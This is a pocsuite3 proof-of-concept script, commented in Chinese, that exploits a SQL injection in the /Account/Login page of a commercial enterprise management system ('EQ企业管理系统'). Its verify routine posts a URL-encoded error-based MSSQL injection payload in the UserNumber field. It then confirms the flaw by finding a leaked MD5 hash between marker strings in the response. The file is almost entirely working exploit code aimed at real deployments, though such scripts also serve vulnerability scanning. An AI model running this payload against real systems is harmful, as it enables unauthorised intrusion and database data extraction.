from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-05-5'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-05-5'  # 编写 PoC 的日期
    updateDate = '2022-05-5'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '易全科技 EQ企业管理系统 /Account/Login 存在SQL注入漏洞'  # PoC 名称
    appPowerLink = 'http://www.gzequan.com/'  # 漏洞厂商主页地址
    appName = '易全科技 EQ企业管理系统'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        易全科技 EQ企业管理系统 /Account/Login 存在SQL注入漏洞
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}
        path = "/Account/Login"
        url = self.url + path
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }
        data = 'UserNumber=admin%27%20and%20convert%28int%2C%28char%2894%29%2Bchar%2894%29%2Bchar%2833%29%2Bcast%28substring%28sys.fn_sqlvarbasetostr%28HASHBYTES%28%27MD5%27%2C%27233%27%29%29%2C3%2C32%29%20as%20varchar%282000%29%29%2Bchar%2833%29%2Bchar%2894%29%2Bchar%2894%29%29%29%3D1--&UserPwd=21232f297a57a5a743894a0e4a801fc3&ServerDB=EQ&RememberPwd=false'
        try:
            resq = requests.post(url=url,data=data,headers=headers,timeout=5)
            if "^^!" in resq.text and "!^^" in resq.text and 'e165421110ba03099a1c0393373c5b43' in resq.text:
                #print(resq.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POC'] = path
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)
